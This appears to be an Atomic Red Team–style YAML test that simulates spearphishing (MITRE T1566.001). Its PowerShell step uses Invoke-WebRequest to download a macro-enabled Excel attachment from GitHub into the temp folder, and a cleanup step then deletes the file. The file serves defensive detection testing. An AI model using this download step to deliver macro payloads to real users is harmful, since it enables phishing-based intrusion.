api_version: "2.0"
name: Download Macro-Enabled Phishing Attachment
description: |
    This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.
    The file "PhishingAttachment.xlsm" is downloaded to the %temp% directory.
uuid: 114ccff9-ae6d-4547-9ead-4cd69f687306
mitre:
    tactics:
        - 'TA0001: Initial Access'
    techniques:
        - 'T1566: Phishing'
    subtechniques:
        - 'T1566.001: Spearphishing Attachment'
requirements:
    platforms:
        - os: windows
steps:
    - name: download-macro-enabled-phishing-attachment
      inline: |
        $url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
      executor: powershell
      cleanup:
        inline: |
            Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction Ignore
        executor: powershell
